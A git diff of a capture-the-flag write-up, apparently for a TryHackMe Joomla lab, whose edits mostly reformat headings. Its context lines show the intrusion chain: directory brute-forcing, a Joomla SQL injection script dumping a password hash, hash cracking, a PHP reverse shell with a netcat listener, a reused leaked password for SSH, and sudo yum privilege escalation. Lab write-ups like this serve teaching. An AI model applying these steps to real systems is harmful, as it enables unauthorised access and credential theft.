@@ -9,11 +9,11 @@ image: /assets/img/Posts/buggle.png
 ---
 
 
-## `INTRODUCTION`
+## INTRODUCTION
 
 This room explores joomla sql misconfigurations and how this can lead to exploitation through privilege escalation
 
-## `Initial recon - Port scanning`
+## Initial recon - Port scanning
 
 We start off with a port scan to identify open ports and the services they are running.
 
@@ -66,9 +66,9 @@ Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
 
 ```
 
-## `Directory Discovery`
+## Directory Scanning
 We then proceed to find points of entry.
-Lets scan for directories using gobuster.
+Let's scan for directories using gobuster.
 ```shell
  gobuster dir -u 10.10.66.95 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 ```
@@ -92,7 +92,7 @@ We discover some directories
 `/administrator` is interesting so we visit `http://10.10.66.95/administrator`
 ![website](/assets/img/Posts/joomla.png)
 
-## `Joomla Vulnerability exploitation`
+## Joomla Vulnerability exploitation
 After some research, I found a python script that attacks joomla login to bruteforce credentials.
 You can find it here. `https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py`
 
@@ -121,7 +121,7 @@ python2 joomblah.py http://10.10.66.95
  [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
   -  Extracting sessions from fb9j5_session
 ```
-## `Password Cracking`
+## Password Cracking
 We get a user and a password hash.
 To crack it, we will use john the ripper.
 Store the hash `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm` in file.
@@ -153,7 +153,7 @@ You can find it here: `https://raw.githubusercontent.com/pentestmonkey/php-rever
 Edit it to match your machine ip and port.
 
 Listen on the port you chose. 
-## `Reverse Shell`
+## Reverse Shell
 ```shell
 $ nc -nlvp 4444
 ```
@@ -206,7 +206,7 @@ public $host = 'localhost';
         public $user = 'root';
         public $password = 'nv5uz9r3ZEDzVjNu';
 ```
-## `SSH`
+## SSH
 We then use the public password to login
 ```shell
  ssh jjameson@10.10.66.95       
@@ -223,7 +223,7 @@ user.txt
 27a260fe3cba712cfdedb1c86d80442e
 ```
 We have the user flag but we can't do much with the priliges we have.
-## `User Privileges`
+## User Privilege
 Let's check  commands that we can execute as sudo.
 ```shell
 [jjameson@dailybugle ~]$ sudo -l
@@ -238,7 +238,7 @@ User jjameson may run the following commands on dailybugle:
 ```
 `(ALL) NOPASSWD: /usr/bin/yum`
 
-## `Binary Exploitation`
+## Binary Exploitation
 We head to GTFOBINS https://gtfobins.github.io/gtfobins/yum/
 
 We find the command to execute the `yum` binary as `sudo`
@@ -280,6 +280,6 @@ eec3d53292b1821868266858d7fa6f79
 ```
 
 
-HAPPY HACKING 
-KEEP LEARNING! ♥
+## HAPPY HACKING 
+## KEEP LEARNING! ♥
 
